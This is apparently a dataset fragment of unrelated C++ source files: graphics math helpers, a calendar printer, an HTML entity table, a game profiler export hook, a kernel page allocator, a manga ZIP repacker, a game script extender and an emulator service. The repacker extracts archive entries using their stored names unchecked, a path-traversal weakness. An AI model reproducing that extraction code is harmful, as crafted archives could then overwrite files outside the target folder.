&format)\n{\n    return float2(\n        2.0f * pixelLocation.x / format.x - 1.0f,\n        2.0f * pixelLocation.y / format.y - 1.0f\n    );\n}\n\n\n/**\n * Convert a spherical unit vector (unit radius) to cartesion.\n *\n * @arg angles: The spherical angles in radians.\n *\n * @returns: The equivalent cartesion vector.\n */\ninline float3 sphericalUnitVectorToCartesion(const float2 &angles)\n{\n    const float sinPhi = sin(angles.y);\n    return float3(\n        cos(angles.x) * sinPhi,\n        cos(angles.y),\n        sin(angles.x) * sinPhi\n    );\n}\n\n\n/**\n * Get the position component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg position: The location to store the position.\n */\ninline void positionFromWorldMatrix(const float4x4 &worldMatrix, float3 &position)\n{\n    position = float3(\n        worldMatrix[0][3],\n        worldMatrix[1][3],\n        worldMatrix[2][3]\n    );\n}\n\n\n/**\n * Get the rotation component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg rotation: The location to store the rotation.\n */\ninline void rotationFromWorldMatrix(const float4x4 &worldMatrix, float3x3 &rotationMatrix)\n{\n    rotationMatrix[0][0] = worldMatrix[0][0];\n    rotationMatrix[0][1] = worldMatrix[0][1];\n    rotationMatrix[0][2] = worldMatrix[0][2];\n    rotationMatrix[1][0] = worldMatrix[1][0];\n    rotationMatrix[1][1] = worldMatrix[1][1];\n    rotationMatrix[1][2] = worldMatrix[1][2];\n    rotationMatrix[2][0] = worldMatrix[2][0];\n    rotationMatrix[2][1] = worldMatrix[2][1];\n    rotationMatrix[2][2] = worldMatrix[2][2];\n}\n\n\n//\n// Randomization functions\n//\n\n\n// Some random constants on the interval [1, 2]\n#define RAND_CONST_0 1.571411510193971f\n#define RAND_CONST_1 1.268632820084931f\n#define RAND_CONST_2 1.7880365647937733f\n#define RAND_CONST_3 1.3546987471558234f\n#define RAND_CONST_4 1.4365958250848703f\n#define RAND_CONST_5 1.7045380669435368f\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float random(const float seed)\n{\n    return fract(sin(73.1f * seed + 91.3458f) * 47453.5453f);\n}\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float2 random(const float2 &seed)\n{\n    return float2(\n        fract(sin(13.157f * seed.x + 71.743f) * 7513.471f),\n        fract(sin(97.519f * seed.y + 113.591f) * 47453.5453f)\n    );\n}\n\n\n/**\n * Create a random point that lies within the unit circle.\n *\n * @arg seed: The random seed.\n *\n *",
    "#include <iostream>\n#include <iomanip>\n\nint main() {\n    int year, month;\n\n    std::cout << \"Enter year: \";\n    std::cin >> year;\n\n    std::cout << \"Enter month (1-12): \";\n    std::cin >> month;\n\n    int daysInMonth;\n    if (month == 2) {\n        if ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) {\n            daysInMonth = 29;\n        } else {\n            daysInMonth = 28;\n        }\n    } else if (month == 4 || month == 6 || month == 9 || month == 11) {\n        daysInMonth = 30;\n    } else {\n        daysInMonth = 31;\n    }\n\n    int startDay = (year - 1) * 365 + (year - 1) / 4 - (year - 1) / 100 + (year - 1) / 400;\n    for (int i = 1; i < month; i++) {\n        if (i == 2) {\n            if ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) {\n                startDay += 29;\n            } else {\n                startDay += 28;\n            }\n        } else if (i == 4 || i == 6 || i == 9 || i == 11) {\n            startDay += 30;\n        } else {\n            startDay += 31;\n        }\n    }\n    startDay %= 7;\n\n    std::cout << \"---------------------------\" << std::endl;\n    std::cout << \"        \" << std::setw(4) << year << \"         \" << std::endl;\n    std::cout << \"---------------------------\" << std::endl;\n    std::cout << \" Sun Mon Tue Wed Thu Fri Sat\" << std::endl;\n    std::cout << \"---------------------------\" << std::endl;\n\n    for (int i = 0; i < startDay; i++) {\n        std::cout << \"    \";\n    }\n\n    for (int day = 1; day <= daysInMonth; day++) {\n        std::cout << std::setw(4) << day;\n\n        if ((startDay + day) % 7 == 0) {\n            std::cout << std::endl;\n        }\n    }\n\n    std::cout << std::endl << \"---------------------------\" << std::endl;\n\n    return 0;\n}",
    "#include \"htmlentityparser.h\"\n#include \"stringutils.h\"\n\n#include <cassert>\n\nnamespace plutobook {\n\nstruct HTMLEntity {\n    char lastCharacter() const { return name[length - 1]; }\n    uint32_t firstValue;\n    uint16_t secondValue;\n    uint16_t length;\n    const char* name;\n};\n\nstatic const HTMLEntity htmlentitytable[] = {\n    {0x000C6, 0x00000, 5, \"AElig\"},\n    {0x000C6, 0x00000, 6, \"AElig;\"},\n    {0x00026, 0x00000, 3, \"AMP\"},\n    {0x00026, 0x00000, 4, \"AMP;\"},\n    {0x000C1, 0x00000, 6, \"Aacute\"},\n    {0x000C1, 0x00000, 7, \"Aacute;\"},\n    {0x00102, 0x00000, 7, \"Abreve;\"},\n    {0x000C2, 0x00000, 5, \"Acirc\"},\n    {0x000C2, 0x00000, 6, \"Acirc;\"},\n    {0x00410, 0x00000, 4, \"Acy;\"},\n    {0x1D504, 0x00000, 4, \"Afr;\"},\n    {0x000C0, 0x00000, 6, \"Agrave\"},\n    {0x000C0, 0x00000, 7, \"Agrave;\"},\n    {0x00391, 0x00000, 6, \"Alpha;\"},\n    {0x00100, 0x00000, 6, \"Amacr;\"},\n    {0x02A53, 0x00000, 4, \"And;\"},\n    {0x00104, 0x00000, 6, \"Aogon;\"},\n    {0x1D538, 0x00000, 5, \"Aopf;\"},\n    {0x02061, 0x00000, 14, \"ApplyFunction;\"},\n    {0x000C5, 0x00000, 5, \"Aring\"},\n    {0x000C5, 0x00000, 6, \"Aring;\"},\n    {0x1D49C, 0x00000, 5, \"Ascr;\"},\n    {0x02254, 0x00000, 7, \"Assign;\"},\n    {0x000C3, 0x00000, 6, \"Atilde\"},\n    {0x000C3, 0x00000, 7, \"Atilde;\"},\n    {0x000C4, 0x00000, 4, \"Auml\"},\n    {0x000C4, 0x00000, 5, \"Auml;\"},\n    {0x02216, 0x00000, 10, \"Backslash;\"},\n    {0x02AE7, 0x00000, 5, \"Barv;\"},\n    {0x02306, 0x00000, 7, \"Barwed;\"},\n    {0x00411, 0x00000, 4, \"Bcy;\"},\n    {0x02235, 0x00000, 8, \"Because;\"},\n    {0x0212C, 0x00000, 11, \"Bernoullis;\"},\n    {0x00392, 0x00000, 5, \"Beta;\"},\n    {0x1D505, 0x00000, 4, \"Bfr;\"},\n    {0x1D539, 0x00000, 5, \"Bopf;\"},\n    {0x002D8, 0x00000, 6, \"Breve;\"},\n    {0x0212C, 0x00000, 5, \"Bscr;\"},\n    {0x0224E, 0x00000, 7, \"Bumpeq;\"},\n    {0x00427, 0x00000, 5, \"CHcy;\"},\n    {0x000A9, 0x00000, 4, \"COPY\"},\n    {0x000A9, 0x00000, 5, \"COPY;\"},\n    {0x00106, 0x00000, 7, \"Cacute;\"},\n    {0x022D2, 0x00000, 4, \"Cap;\"},\n    {0x02145, 0x00000, 21, \"CapitalDifferentialD;\"},\n    {0x0212D, 0x00000, 8, \"Cayleys;\"},\n    {0x0010C, 0x00000, 7, \"Ccaron;\"},\n    {0x000C7, 0x00000, 6, \"Ccedil\"},\n    {0x000C7, 0x00000, 7, \"Ccedil;\"},\n    {0x00108, 0x00000, 6, \"Ccirc;\"},\n    {0x02230, 0x00000, 8, \"Cconint;\"},\n    {0x0010A, 0x00000, 5, \"Cdot;\"},\n    {0x000B8, 0x00000, 8, \"Cedilla;\"},\n    {0x000B7, 0x00000, 10, \"CenterDot;\"},\n    {0x0212D, 0x00000, 4, \"Cfr;\"},\n    {0x003A7, 0x00000, 4, \"Chi;\"},\n    {0x02299, 0x00000, 10, \"CircleDot;\"},\n    {0x02296, 0x00000, 12, \"CircleMinus;\"},\n    {0x02295, 0x00000, 11, \"CirclePlus;\"},\n    {0x02297, 0x00000, 12, \"CircleTimes;\"},\n    {0x02232, 0x00000, 25, \"ClockwiseContourIntegral;\"},\n    {0x0201D, 0x00000, 22, \"CloseCurlyDoubleQuote;\"},\n    {0x02019, 0x00000, 16, \"CloseCurlyQuote;\"},\n    {0x02237, 0x00000, 6, \"Colon;\"},\n    {0x02A74, 0x00000, 7, \"Colone;\"},\n    {0x02261, 0x00000, 10, \"Congruent;\"},\n    {0x0222F, 0x00000, 7, \"Conint;\"},\n    {0x0222E, 0x00000, 16, \"ContourIntegral;\"},\n    {0x02102, 0x00000, 5, \"Copf;\"},\n    {0x02210, 0x00000, 10, \"Coproduct;\"},\n    {0x02233, 0x00000, 32, \"CounterClockwiseContourIntegral;\"},\n    {0x02A2F, 0x00000, 6, \"Cross;\"},\n    {0x1D49E, 0x00000, 5, \"Cscr;\"},\n    {0x022D3, 0x00000, 4, \"Cup;\"},\n    {0x0224D, 0x00000, 7, \"CupCap;\"},\n    {0x02145, 0x00000, 3, \"DD;\"},\n    {0x02911, 0x00000, 9, \"DDotrahd;\"},\n    {0x00402, 0x00000, 5, \"DJcy;\"},\n    {0x00405, 0x00000, 5, \"DScy;\"},\n    {0x0040F, 0x00000, 5, \"DZcy;\"},\n    {0x02021, 0x00000, 7, \"Dagger;\"},\n    {0x021A1, 0x00000, 5, \"Darr;\"},\n    {0x02AE4, 0x00000, 6, \"Dashv;\"},\n    {0x0010E, 0x00000, 7, \"Dcaron;\"},\n    {0x00414, 0x00000, 4, \"Dcy;\"},\n    {0x02207, 0x00000, 4, \"Del;\"},\n    {0x00394, 0x00000, 6, \"Delta;\"},\n    {0x1D507, 0x00000, 4, \"Dfr;\"},\n    {0x000B4, 0x00000, 17, \"DiacriticalAcute;\"},\n    {0x002D9, 0x00000, 15, \"DiacriticalDot;\"},\n    {0x002DD, 0x00000, 23, \"DiacriticalDoubleAcute;\"},\n    {0x00060, 0x00000, 17, \"DiacriticalGrave;\"},\n    {0x002DC, 0x00000, 17, \"DiacriticalTilde;\"},\n    {0x022C4, 0x00000, 8, \"Diamond;\"},\n    {0x02146, 0x00000, 14, \"DifferentialD;\"},\n    {0x1D53B, 0x00000, 5, \"Dopf;\"},\n    {0x000A8, 0x00000, 4, \"Dot;\"},\n    {0x020DC, 0x00000, 7, \"DotDot;\"},\n    {0x02250, 0x00000, 9, \"DotEqual;\"},\n    {0x0222F, 0x00000, 22, \"DoubleContourIntegral;\"},\n    {0x000A8, 0x00000, 10, \"DoubleDot;\"},\n    {0x021D3, 0x00000, 16, \"DoubleDownArrow;\"},\n    {0x021D0, 0x00000, 16, \"DoubleLeftArrow;\"},\n    {0x021D4, 0x00000, 21, \"DoubleLeftRightArrow;\"},\n    {0x02AE4, 0x00000, 14, \"DoubleLeftTee;\"},\n    {0x027F8, 0x00000, 20, \"DoubleLongLeftArrow;\"},\n    {0x027FA, 0x00000, 25, \"DoubleLongLeftRightArrow;\"},\n    {0x027F9, 0x00000, 21, \"DoubleLongRightArrow;\"},\n    {0x021D2, 0x00000, 17, \"DoubleRightArrow;\"},\n    {0x022A8, 0x00000, 15, \"DoubleRightTee;\"},\n    {0x021D1, 0x00000, 14, \"DoubleUpArrow;\"},\n    {0x021D5, 0x00000, 18, \"DoubleUpDownArrow;\"},\n    {0x02225, 0x00000, 18, \"DoubleVerticalBar;\"},\n    {0x02193, 0x00000, 10, \"DownArrow;\"},\n    {0x02913, 0x00000, 13, \"DownArrowBar;\"},\n    {0x021F5, 0x00000, ",
    "#include <GarrysMod/InterfacePointers.hpp>\n#include \"main.h\"\n#include \"detours.h\"\n#include <vprof.h>\n#include <sstream>\n#include <filesystem.h>\n#include <string>\n#include <chrono>\n#include <ctime>\n#include <iomanip>\n\nConVar vprof_exportreport(\"vprof_exportreport\", \"1\");\n\nstd::string GetCurrentTime() {\n    auto now = std::chrono::system_clock::now();\n    std::time_t now_time = std::chrono::system_clock::to_time_t(now);\n\n    std::stringstream ss;\n    ss << std::put_time(std::localtime(&now_time), \"%Y-%m-%d %H-%M-%S\");\n\n    return ss.str();\n}\n\nstd::stringstream ss;\nSpewOutputFunc_t last_spew;\nvoid FinishDump()\n{\n\tSpewOutputFunc(last_spew);\n\n\tIFileSystem* fs = InterfacePointers::FileSystem();\n\tif (!fs->IsDirectory(\"vprof\", \"MOD\"))\n\t{\n\t\tif (fs->FileExists(\"vprof\", \"MOD\"))\n\t\t{\n\t\t\tMsg(\"vprof/ is a file? Please delete it or disable vprof_exportreport.\\n\");\n\t\t\treturn;\n\t\t}\n\n\t\tfs->CreateDirHierarchy(\"vprof\", \"MOD\");\n\t}\n\n\tstd::string filename = GetCurrentTime();\n\tfilename = \"vprof/\" + filename + \".txt\";\n\tFileHandle_t fh = fs->Open(filename.c_str(), \"a+\", \"MOD\");\n\tif (fh)\n\t{\n\t\tstd::string str = ss.str();\n\t\tfs->Write(str.c_str(), str.length(), fh);  \n\t\tMsg(\"Wrote vprof report into %s\\n\", filename.c_str());\n\n\t\tfs->Close(fh);\n\t}\n\n\tss.str(\"\");\n}\n\nbool vprof_workaround = false;\nstatic SpewRetval_t VProf_Spew(SpewType_t type, const char *msg)\n{\n\tss << msg;\n\tif (vprof_workaround && strcmp(msg, \"******** END VPROF REPORT ********\\n\") == 0)\n\t{\n\t\tFinishDump();\n\t}\n\treturn SPEW_CONTINUE;\n}\n\nvoid BeginDump()\n{\n\tlast_spew = GetSpewOutputFunc();\n\tSpewOutputFunc(VProf_Spew);\n}\n\nSpewOutputFunc_t original_spew = nullptr;\nstatic SpewRetval_t VProfCheck_Spew(SpewType_t type, const char *msg)\n{\n\tif (strcmp(msg, \"******** BEGIN VPROF REPORT ********\\n\") == 0)\n\t{\n\t\tBeginDump();\n\t\treturn VProf_Spew(type, msg);\n\t}\n\n\treturn original_spew(type, msg);\n}\n\n#ifdef SYSTEM_WINDOWS\nvoid AddWindowsWorkaround()\n{\n\tMsg(\"[vprof] Applied a workaround for vprof_exportreport!\\n\"); // ToDo: Find out why Detouring::ClassProxy breaks for CVProfile\n\tvprof_workaround = true;\n\toriginal_spew = GetSpewOutputFunc();\n\tSpewOutputFunc(VProfCheck_Spew);\n}\n\nvoid RemoveWindowsWorkaround()\n{\n\tvprof_workaround = false;\n\tif (original_spew)\n\t\tSpewOutputFunc(original_spew);\n}\n#else\nDetouring::Hook detour_CVProfile_OutputReport;\nvoid hook_CVProfile_OutputReport(void* funky_class, int type, const tchar* pszStartMode, int budgetGroupID)\n{\n\tif (!vprof_exportreport.GetBool())\n\t{\n\t\tdetour_CVProfile_OutputReport.GetTrampoline<CVProfile_OutputReport>()(funky_class, type, pszStartMode, budgetGroupID);\n\t\treturn;\n\t}\n\n\tBeginDump();\n\tdetour_CVProfile_OutputReport.GetTrampoline<CVProfile_OutputReport>()(funky_class, type, pszStartMode, budgetGroupID);\n\tFinishDump();\n}\n#endif\n\nvoid AddVProfExport()\n{\n\tRemoveVProfExport();\n\n#ifdef SYSTEM_WINDOWS\n\tAddWindowsWorkaround();\n#else\n\tSourceSDK::ModuleLoader libtier0_loader(\"libtier0\");\n\tCreateDetour(&detour_CVProfile_OutputReport, \"CVProfile::OutputReport\", libtier0_loader.GetModule(), CVProfile_OutputReportSym, (void*)hook_CVProfile_OutputReport, DETOUR_VPROFEXPORT);\n#endif\n}\n\nvoid RemoveVProfExport()\n{\n#ifdef SYSTEM_WINDOWS\n\tRemoveWindowsWorkaround();\n#else\n\tRemoveDetours(DETOUR_VPROFEXPORT);\n#endif\n}",
    "#include <lib/list.h>\n#include <lib/misc.h>\n#include <lib/print.h>\n#include <lib/spinlock.h>\n#include <limine.h>\n#include <memory/pmem.h>\n\n#include <cstring>\n\nusing namespace kernel;\n\n// @todo: Add locking to the allocator\n// @idea: Implement buddy system for physical memory allocation so we can hand out more than one\n// contiguous physical page at a time\n// @idea: It would be nice to implement a checksum for the physical memory database to detect memory\n// corruption and panic if it happens\n// @idea: Implement a separate list for dirty pages that just got freed so we can zero them out\n// before putting them back in the free list, this would be done by a separate, low-priority thread\n\nnamespace {\n\nstruct physical_region {\n  list_node<physical_region> node;  // Points to physical_regions\n  physical_addr base;               // The base address of the physical region\n  size_t page_count;                // The number of pages in the physical region\n  physical_page pages[];            // The page structures for the physical region (inline)\n};\n\nspin_lock allocator_lock;\nlist<physical_page, &physical_page::node> free_pages;\nlist<physical_region, &physical_region::node> physical_regions;\n\nvolatile limine_hhdm_request hhdm_request = {\n  .id = LIMINE_HHDM_REQUEST,\n  .revision = 1,\n  .response = nullptr,\n};\n\nvolatile limine_memmap_request memmap_request = {\n  .id = LIMINE_MEMMAP_REQUEST,\n  .revision = 1,\n  .response = nullptr,\n};\n\nvoid track_region(physical_addr base, size_t length) {\n  size_t page_count = length / PAGE_SIZE;\n  size_t aligned_length = page_count * PAGE_SIZE;\n  size_t used = align_up(sizeof(physical_region) + sizeof(physical_page) * page_count, PAGE_SIZE);\n\n  // Check if the physical region is big enough to hold the physical region structure\n  // and at least 16 individual pages, I don't think it's worth bothering with such\n  // small regions\n  if (aligned_length - used < PAGE_SIZE * 16) {\n    kprintf(\"pmem: skipping physical region 0x%zx-0x%zx, too small\\n\", base, base + aligned_length);\n    return;\n  }\n\n  // Set up the physical region structure\n  auto* region = static_cast<physical_region*>(P2V(base));\n  region->base = base;\n  region->page_count = page_count;\n\n  kprintf(\n    \"pmem: registering physical region 0x%zx-0x%zx, %zu KiB, %zu pages, %zu KiB for PFDB\\n\",\n    region->base, region->base + aligned_length, aligned_length / 1024, region->page_count,\n    used / 1024\n  );\n\n  // Initialize the individual page structures\n  for (size_t j = 0; j < region->page_count; ++j) {\n    region->pages[j].addr = region->base + j * PAGE_SIZE;\n  }\n\n  for (size_t j = 0; j < region->page_count; ++j) {\n    auto& page = region->pages[j];\n\n    if (j < used / PAGE_SIZE) {\n      // Mark the pages used by the physical region structure as used\n      page.usage = kPageUsagePfnDatabase;\n    } else {\n      // Mark the remaining pages as free\n      page.usage = kPageUsageFree;\n      page.is_dirty = true;\n\n      free_pages.push_back(&page);\n    }\n  }\n\n  // Add the physical region to the list\n  physical_regions.push_back(region);\n}\n\n}  // namespace\n\nvoid kernel::init_phys_allocator() {\n  const auto* hhdm_response = hhdm_request.response;\n  const auto* memmap_response = memmap_request.response;\n\n  // @todo: Fix this lol\n  kassert(hhdm_response->offset == HHDM_OFFSET);\n\n  for (size_t i = 0; i < memmap_response->entry_count; ++i) {\n    const auto* entry = memmap_response->entries[i];\n\n    // Skip memory entries that were reported as not usable\n    if (entry->type != LIMINE_MEMMAP_USABLE)\n      continue;\n\n    track_region(entry->base, entry->length);\n  }\n}\n\nphysical_addr kernel::alloc_page(page_usage usage) {\n  kassert(usage > kPageUsageFree && usage < kPageUsageMax);\n\n  lock_guard _(allocator_lock);\n\n  if (free_pages.empty())\n    return 0;\n\n  auto* page = free_pages.pop_front();\n\n  // Make sure the page is actually free, otherwise panic\n  // Hopefully that never happens, that would indicate that there's a bug\n  // or that the physical memory database was somehow corrupted (bad)\n  kassert_msg(\n    page->usage == kPageUsageFree, \"alloc_page: page database corruption: 0x%zx usage %u\",\n    page->addr, page->usage\n  );\n\n  // Mark the page as used\n  page->usage = usage;\n\n  // If the page is marked as dirty, zero it out before handing it out\n  // This flag is currently never reset, but in the future it will be used\n  // to efficiently zero out pages in the background\n  if (page->is_dirty) {\n    auto* mem8 = static_cast<unsigned char*>(P2V(page->addr));\n    std::memset(mem8, 0, PAGE_SIZE);\n  }\n\n  return page->addr;\n}\n\nvoid kernel::free_page(physical_addr addr) {\n  auto* page = addr_to_physical_page(addr);\n\n  // Make sure that the page comes from a registered physical region\n  kassert_msg(page != nullptr, \"free_page: attempt to free untracked memory at 0x%zx\\n\", addr);\n\n  // Make sure that we are not trying to double-free the page, this is obviously a bug\n  kassert_msg(\n    page->usage != kPageUsageFree,\n    \"free_page: attempt to free memory",
    "#include \"Repack.h\"\n\n// Function to extract volume name from archive name\nstring Repack::extractVolume(const string& filename) {\n    regex pattern(pattern_volume.c_str());\n    smatch matches; // object for storing found matches\n\n    if (regex_search(filename, matches, pattern) && matches.size() > 1) {\n        return matches[1].str();\n    }\n    return \"\";\n}\n\n// Function to extract chapter number from archive name\nstring Repack::extractChapter(const string& filename) {\n    regex pattern(pattern_chapter.c_str());\n    smatch matches; // object for storing found matches\n    if (regex_search(filename, matches, pattern) && matches.size() > 1) {\n        return matches[1].str();\n    }\n    return \"\";\n}\n\n// Function to unzip a file\nbool Repack::unzip(const string& zip_filename, const string& extract_dir) {\n    mz_zip_archive zip_archive;\n    memset(&zip_archive, 0, sizeof(zip_archive));\n    if (!mz_zip_reader_init_file(&zip_archive, zip_filename.c_str(), 0)) {\n        cerr << \"Failed to open zip file: \" << zip_filename << endl;\n        return false;\n    }\n\n    // Get the number of files in the ZIP archive\n    int num_files = mz_zip_reader_get_num_files(&zip_archive);\n    if (num_files <= 0) {\n        cerr << \"No files found in zip archive: \" << zip_filename << endl;\n        mz_zip_reader_end(&zip_archive);\n        return false;\n    }\n\n    // Iterate through each file in the ZIP archive and extract it\n    for (int i = 0; i < num_files; ++i) {\n        mz_zip_archive_file_stat file_stat;\n        if (!mz_zip_reader_file_stat(&zip_archive, i, &file_stat)) {\n            cerr << \"Failed to get file info from zip archive: \" << zip_filename << endl;\n            mz_zip_reader_end(&zip_archive);\n            return false;\n        }\n\n        // Extract the file\n        if (!mz_zip_reader_extract_to_file(&zip_archive, i, (extract_dir + \"/\" + file_stat.m_filename).c_str(), 0)) {\n            cerr << \"Failed to extract file from zip archive: \" << file_stat.m_filename << endl;\n            mz_zip_reader_end(&zip_archive);\n            return false;\n        }\n    }\n\n    // Cleanup\n    mz_zip_reader_end(&zip_archive);\n    return true;\n}\n\n// Process directory function\nvoid Repack::start(const string& directory, const string& pv, const string& pch) {\n    pattern_volume = pv;\n    pattern_chapter = pch;\n    // Loop through all files with .zip extension in the current directory\n    for (const auto& entry : fs::directory_iterator(directory)) {\n        // Check whether the element is a regular file and whether it has a \".zip\" extension.\n        if (fs::is_regular_file(entry) && entry.path().extension() == \".zip\") {\n            // Extracting the volume number and chapter number from the archive file name\n            string volume = extractVolume(entry.path().filename().string());\n            string chapter = extractChapter(entry.path().filename().string());\n\n            if (!volume.empty() && !chapter.empty()) {\n                string volume_dir = directory + \"/Manga/Volume \" + volume;\n                string chapter_dir = volume_dir + \"/Chapter \" + chapter;\n\n                // Create the necessary directories if they don't exist\n                if (!fs::exists(volume_dir)) {\n                    fs::create_directories(volume_dir);\n                }\n                if (!fs::exists(chapter_dir)) {\n                    fs::create_directories(chapter_dir);\n                }\n\n                // Unzip the archive into the corresponding chapter directory\n                if (unzip(entry.path().string(), chapter_dir)) {\n                    cout << \"Extraction successful for: \" << entry.path().filename() << endl;\n                } else {\n                    cerr << \"Extraction failed for: \" << entry.path().filename() << endl;\n                }\n            } else {\n                cerr << \"Failed to extract volume or chapter from filename: \" << entry.path().filename() << endl;\n            }\n        }\n    }\n}",
    "#include \"plugin.h\"\n#include \"CRunningScript.h\"\n#include \"CTheScripts.h\"\n#include \"CMessages.h\"\n//#include \"ScmExtenderAPI.h\"\n\nclass ScmExtender {\npublic: \n    static inline std::unordered_map<int32_t, int8_t(*)(int32_t*)> mapOfNewOpcodes = {};\n\n    static __declspec(dllexport) void AddOneCommand(int32_t command, int8_t(*func)(int32_t*)) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end())\n            std::cout << \"[SCRIPT] Command id \" << command << \" overwritten\" << std::endl;\n\n        mapOfNewOpcodes[command] = func;\n    }\n\n    static inline CRunningScript* currentScript = nullptr;\n    static __declspec(dllexport) void CollectParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->CollectParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void StoreParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->StoreParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void UpdateCompareFlag(uint8_t flag) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->UpdateCompareFlag(flag);\n    }\n\n    static int8_t ProcessOneCommand(CRunningScript* script) {\n        ++CTheScripts::CommandsExecuted;\n\n        int32_t m_nPrevIp = script->m_nIp;\n        int32_t command = CTheScripts::ScriptSpace[script->m_nIp + 1] << 8 | CTheScripts::ScriptSpace[script->m_nIp];\n        script->m_nIp += sizeof(uint16_t);\n        script->m_bNotFlag = (command & 0x8000);\n        command &= 0x7FFF;\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end()) {\n            currentScript = script;\n            tScriptParam* params = CTheScripts::ScriptParams;\n            return f->second((int32_t*)params);\n        }\n\n        script->m_nIp = m_nPrevIp;\n        --CTheScripts::CommandsExecuted;\n\n        return script->ProcessOneCommand();\n    }\n\n    ScmExtender() {\n        plugin::Events::initRwEvent += []() {\n            CTheScripts::ScriptSpace = plugin::patch::Get<uint8_t*>(0x4387A0 + 3);\n        };\n\n        auto processScriptHook = [](CRunningScript* script, void*) {\n            if (script->m_bUseMissionCleanup)\n                script->DoDeathArrestCheck();\n\n            if (script->m_bIsMission && CTheScripts::FailCurrentMission == 1 && script->m_nSP == 1)\n                script->m_nIp = script->m_anStack[--script->m_nSP];\n\n            if (CTimer::m_snTimeInMilliseconds >= script->m_nWakeTime) {\n                while (!ProcessOneCommand(script)) {\n                }\n            }\n\n            if (!script->m_bAwake)\n                return;\n\n            if (!(CPad::GetPad(0)->NewState.ButtonCross && !CPad::GetPad(0)->OldState.ButtonCross))\n                return;\n\n            script->m_nWakeTime = 0;\n\n            for (int i = 0; i < 6; i++) {\n                if (CMessages::BIGMessages[i].m_Stack[0].m_pText != nullptr)\n                    CMessages::BIGMessages[i].m_Stack[0].m_nStartTime = 0;\n            }\n\n            if (CMessages::BriefMessages[0].m_pText != nullptr)\n                CMessages::BriefMessages[0].m_nStartTime = 0;\n        };\n        plugin::patch::RedirectCall(0x4393DF, LAMBDA(void, __fastcall, processScriptHook, CRunningScript*, void*));\n    }\n} scmExtender;\n",
    "// SPDX-FileCopyrightText: Copyright 2018 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"core/hle/service/bcat/bcat_service.h\"\n#include \"core/hle/service/bcat/delivery_cache_storage_service.h\"\n#include \"core/hle/service/bcat/service_creator.h\"\n#include \"core/hle/service/cmif_serialization.h\"\n#include \"core/hle/service/filesystem/filesystem.h\"\n\nnamespace Service::BCAT {\n\nstd::unique_ptr<BcatBackend> CreateBackendFromSettings([[maybe_unused]] Core::System& system,\n                                                       DirectoryGetter getter) {\n    return std::make_unique<NullBcatBackend>(std::move(getter));\n}\n\nIServiceCreator::IServiceCreator(Core::System& system_, const char* name_)\n    : ServiceFramework{system_, name_}, fsc{system.GetFileSystemController()} {\n    // clang-format off\n    static const FunctionInfo functions[] = {\n        {0, D<&IServiceCreator::CreateBcatService>, \"CreateBcatService\"},\n        {1, D<&IServiceCreator::CreateDeliveryCacheStorageService>, \"CreateDeliveryCacheStorageService\"},\n        {2, D<&IServiceCreator::CreateDeliveryCacheStorageServiceWithApplicationId>, \"CreateDeliveryCacheStorageServiceWithApplicationId\"},\n        {3, nullptr, \"CreateDeliveryCacheProgressService\"},\n        {4, nullptr, \"CreateDeliveryCacheProgressServiceWithApplicationId\"},\n    };\n    // clang-format on\n\n    RegisterHandlers(functions);\n\n    backend =\n        CreateBackendFromSettings(system_, [this](u64 tid) { return fsc.GetBCATDirectory(tid); });\n}\n\nIServiceCreator::~IServiceCreator() = default;\n\nResult IServiceCreator::CreateBcatService(ClientProcessId process_id,\n                                          OutInterface<IBcatService> out_interface) {\n    LOG_INFO(Service_BCAT, \"called, process_id={}\", process_id.pid);\n    *out_interface = std::make_shared<IBcatService>(system, *backend);\n    R_SUCCEED();\n}\n\nResult IServiceCreator::CreateDeliveryCacheStorageService(\n    ClientProcessId process_id, OutInterface<IDeliveryCacheStorageService> out_interface) {\n    LOG_INFO(Service_BCAT, \"called, process_id={}\", process_id.pid);\n\n    const auto title_id = system.GetApplicationProcessProgramID();\n    *out_interface =\n        std::make_shared<IDeliveryCacheStorageService>(system, fsc.GetBCATDirectory(title_id));\n    R_SUCCEED();\n}\n\nResult IServiceCreator::CreateDeliveryCacheStorageServiceWithApplicationId(\n    u64 application_id, OutInterface<IDeliveryCacheStorageService> out_interface) {\n    LOG_DEBUG(Service_BCAT, \"called, application_id={:016X}\", application_id);\n    *out_interface = std::make_shared<IDeliveryCacheStorageService>(\n        system, fsc.GetBCATDirectory(application_id));\n    R_SUCCEED();\n}\n\n} // namespace Service::BCAT\n",
